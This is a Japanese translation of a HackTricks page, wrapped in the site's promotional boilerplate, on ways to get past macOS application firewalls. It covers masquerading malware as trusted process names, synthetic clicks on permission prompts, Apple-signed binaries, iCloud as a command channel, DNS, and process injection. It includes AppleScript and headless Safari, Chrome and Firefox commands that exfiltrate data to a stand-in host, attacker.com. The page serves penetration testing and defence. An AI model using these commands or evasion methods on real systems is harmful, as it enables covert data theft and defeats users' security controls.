# macOS ファイアウォールのバイパス

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## 発見された技術

以下の技術は、いくつかのmacOSファイアウォールアプリで動作することが確認されました。

### ホワイトリスト名の悪用

* 例えば、**`launchd`**のようなよく知られたmacOSプロセスの名前でマルウェアを呼び出すこと。

### 合成クリック

* ファイアウォールがユーザーに許可を求める場合、マルウェアに**許可をクリックさせる**。

### **Apple署名のバイナリを使用**

* **`curl`**のようなもの、また**`whois`**のような他のものも。

### よく知られたAppleドメイン

ファイアウォールは、**`apple.com`**や**`icloud.com`**のようなよく知られたAppleドメインへの接続を許可している可能性があります。そしてiCloudはC2として使用される可能性があります。

### 一般的なバイパス

ファイアウォールをバイパスするためのいくつかのアイデア。

### 許可されたトラフィックの確認

許可されたトラフィックを知ることで、潜在的にホワイトリストに登録されたドメインや、どのアプリケーションがそれらにアクセスできるかを特定するのに役立ちます。
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNSの悪用

DNS解決は、DNSサーバーに接続することが許可されていると思われる**`mdnsreponder`**署名アプリケーションを介して行われます。

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ブラウザアプリを介して

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* サファリ
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスインジェクションを介して

接続が許可されているプロセスに**コードをインジェクト**できれば、ファイアウォールの保護を回避できます：

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## 参考文献

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**

</details>
{% endhint %}
